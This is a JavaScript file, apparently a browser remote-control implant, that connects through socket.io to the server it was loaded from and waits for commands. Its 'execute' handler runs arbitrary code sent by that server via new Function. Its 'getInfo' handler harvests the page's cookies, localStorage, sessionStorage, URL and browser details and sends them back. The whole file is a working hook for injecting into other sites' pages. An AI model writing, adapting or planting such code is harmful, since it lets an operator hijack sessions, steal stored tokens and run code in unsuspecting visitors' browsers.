(function () {
  const currScript = /** @type {HTMLScriptElement} */ (
    /** @type {*} */ document.querySelector("#script-rc")
  );
  if (!currScript) throw new Error("No script element found");

  const scriptUrl = new URL(currScript.src);
  const protocol = scriptUrl.protocol;
  const host = scriptUrl.host;
  const scriptId = scriptUrl.pathname
    .split("/")
    .find((x) => (Number.isNaN(Number(x)) ? false : Number(x)));
  const socketIoScript = document.createElement("script");

  socketIoScript.src = `${protocol}//${host}/socket.io/socket.io.js`;
  document.head.appendChild(socketIoScript);
  socketIoScript.onload = startTheScript;

  function log(...message) {
    // Only log messages from the same host as the script
    // Which means we are on /example page and not on the actual client
    if (host !== window.location.host) return;
    console.log(...message);
  }

  function startTheScript() {
    // @ts-ignore
    const socket = io(`${protocol}//${host}`);

    const state = {};

    state.sessionId = localStorage.getItem("sessionId") ?? "new";
    state.scriptId = scriptId;

    socket.on("connect", handleConnectEvent);

    socket.on("session", handleSessionEvent);

    socket.on("disconnect", () => log("Disconnected from the server"));

    socket.on("message", handleMessageEvent);
    socket.on("command", handleCommandEvent);

    function handleConnectEvent() {
      log("Connected to the server");
      if (state.sessionId) {
        socket.emit("join", {
          scriptId: state.scriptId,
          sessionId: state.sessionId,
        });
        log("Joining session", state.sessionId);
      } else {
        socket.emit("join", { sessionId: "new", scriptId: state.scriptId });
      }
    }

    function handleSessionEvent(data) {
      log("session", data);
      if (data.sessionId) {
        localStorage.setItem("sessionId", data.sessionId);
        state.sessionId = data.sessionId;
      }
    }

    function handleMessageEvent(data) {
      log("message", data);
    }

    function handleCommandEvent(data) {
      log("command", data);
      switch (data.type) {
        case "execute":
          return executeCommand(data);
        case "getInfo":
          socket.emit("result", {
            type: "getInfo-result",
            payload: getUsefulInfo(),
            commandId: data.commandId,
          });
          return;
        default:
          log("Unknown command type", data.type);
          return;
      }
    }

    function executeCommand(data) {
      try {
        const func = new Function(
          `return async function() {try {${data.payload}} catch(e) { return e?.message ?? e }}()`
        );
        func().then((result) => {
          sendResponse("result", {
            type: "execute-result",
            payload:
              typeof result === "object" ? JSON.stringify(result) : result,
            commandId: data.commandId,
          });
        });
      } catch (e) {
        sendResponse("result", {
          type: "execute-error",
          payload: e.message,
          commandId: data.commandId,
        });
      }
    }

    function JSONReplaceFunctions(key, value) {
      if (typeof value === "function") {
        return value.toString();
      }
      return value;
    }

    function getUsefulInfo() {
      const navigatorKeys = Object.keys(Object.getPrototypeOf(navigator));
      const navigatorValues = {};
      navigatorKeys.forEach((key) => {
        try {
          if (navigatorKeys[key] instanceof Function) {
            navigatorValues[key] = navigator[key]();
          } else {
            navigatorValues[key] = navigator[key];
          }
        } catch (e) {
          navigatorValues[key] = e;
        }
      });

      const localStorageKeys = Object.keys(window.localStorage);
      const localStorage = {};

      localStorageKeys.forEach((key) => {
        try {
          localStorage[key] = window.localStorage.getItem(key);
        } catch (e) {
          localStorage[key] = e;
        }
      });

      const sessionStorageKeys = Object.keys(window.sessionStorage);
      const sessionStorage = {};

      sessionStorageKeys.forEach((key) => {
        try {
          sessionStorage[key] = window.sessionStorage.getItem(key);
        } catch (e) {
          sessionStorage[key] = e;
        }
      });

      const location = window.location.href;
      const cookies = Object.fromEntries(
        document.cookie.split(";").map((x) => x.split("="))
      );
      const plugins = Array.from(navigator.plugins).map((x) => x.name);

      return {
        navigator: JSON.parse(
          JSON.stringify(navigatorValues, JSONReplaceFunctions)
        ),
        localStorage: JSON.parse(
          JSON.stringify(localStorage, JSONReplaceFunctions)
        ),
        sessionStorage: JSON.parse(
          JSON.stringify(sessionStorage, JSONReplaceFunctions)
        ),

        location,
        cookies: JSON.parse(JSON.stringify(cookies, JSONReplaceFunctions)),
        plugins: JSON.parse(JSON.stringify(plugins, JSONReplaceFunctions)),
      };
    }

    function sendResponse(type, payload, ...rest) {
      socket.emit("result", { type, payload, ...rest, ...state });
    }
  }
})();
